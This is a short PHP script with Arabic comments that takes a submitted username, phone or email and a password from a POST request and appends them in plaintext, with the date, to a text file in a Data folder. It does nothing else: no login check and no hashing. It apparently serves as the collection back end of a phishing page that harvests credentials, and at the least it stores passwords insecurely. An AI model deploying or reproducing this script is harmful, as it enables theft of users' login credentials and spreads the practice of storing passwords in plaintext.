<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // مسار المجلد الذي تريد حفظ الملف فيه
    $folderPath = 'Data/';
    
    // اسم الملف النصي الذي سيتم حفظ البيانات فيه
    $fileName = 'userdata.txt';
    
    // البيانات التي سيتم حفظها في الملف مع تاريخ التسجيل بالتنسيق المطلوب
    $formattedDate = date('d F Y'); // تنسيق التاريخ المطلوب (05 April 1999)
    $data = "Date: $formattedDate\n";
    $data .= "Username/Phone/Email: $username\n";
    $data .= "Password: $password\n\n";
    
    // حفظ البيانات في ملف النص
    file_put_contents($folderPath . $fileName, $data, FILE_APPEND);
    
    // إرسال رسالة نجاح إلى العميل (هذا اختياري)
    
}
?>
